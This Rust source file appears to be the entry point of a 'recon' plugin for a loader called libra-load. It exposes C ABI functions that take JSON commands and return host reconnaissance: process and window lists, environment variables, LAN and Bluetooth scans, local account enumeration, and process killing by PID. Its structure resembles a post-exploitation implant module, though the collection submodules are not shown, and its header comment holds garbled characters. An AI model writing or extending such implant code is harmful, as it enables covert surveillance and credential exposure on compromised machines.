//! Recon cloud module 鈥?system/process/window/env/lanscan/bluetooth/local accounts.
#![allow(non_snake_case)]
#![allow(clippy::upper_case_acronyms)]

mod env_info;
mod process_info;
mod window_info;
mod lan_scan;
mod bluetooth_scan;
mod local_accounts;

use serde_json::Value;

/// libra-load ABI entry point.
#[no_mangle]
pub extern "C" fn module_name() -> *const u8 {
    concat!("recon", "\0").as_ptr() as *const u8
}

#[no_mangle]
pub unsafe extern "system" fn module_main(
    input: *const u8,
    input_len: usize,
    output: *mut u8,
    output_cap: usize,
) -> usize {
    let input_json = if input.is_null() || input_len == 0 {
        "{}".to_string()
    } else {
        String::from_utf8_lossy(std::slice::from_raw_parts(input, input_len)).to_string()
    };
    let result = dispatch(&input_json);
    write_output(&result, output, output_cap)
}

fn dispatch(input: &str) -> String {
    let v: Value = serde_json::from_str(input).unwrap_or(Value::Object(Default::default()));
    let op = v.get("op").and_then(|o| o.as_str()).unwrap_or("");

    match op {
        "processes" => process_info::ProcessInfo::collect(None),
        "windows" => window_info::WindowInfo::collect(),
        "env" => env_info::EnvInfo::collect(),
        "lanscan" => run_async(lan_scan::LanScan::scan()),
        "bluetooth" => run_async(bluetooth_scan::BluetoothScanner::scan()),
        "local_accounts" => run_async(local_accounts::LocalAccountEnumerator::enumerate()),
        "kill" => {
            let pid = v.get("pid").and_then(|p| p.as_u64()).unwrap_or(0) as u32;
            let ok = process_info::ProcessInfo::kill(pid);
            format!(r#"{{"success":{}}}"#, ok)
        }
        _ => format!(r#"{{"error":"unknown recon op '{}'"}}"#, op),
    }
}

fn run_async<F: std::future::Future<Output = String>>(f: F) -> String {
    tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
        .map(|rt| rt.block_on(f))
        .unwrap_or_else(|e| format!(r#"{{"error":"runtime: {}"}}"#, e))
}

fn write_output(s: &str, output: *mut u8, output_cap: usize) -> usize {
    let bytes = s.as_bytes();
    let n = bytes.len().min(output_cap);
    if n > 0 && !output.is_null() {
        unsafe { std::ptr::copy_nonoverlapping(bytes.as_ptr(), output, n); }
    }
    n
}
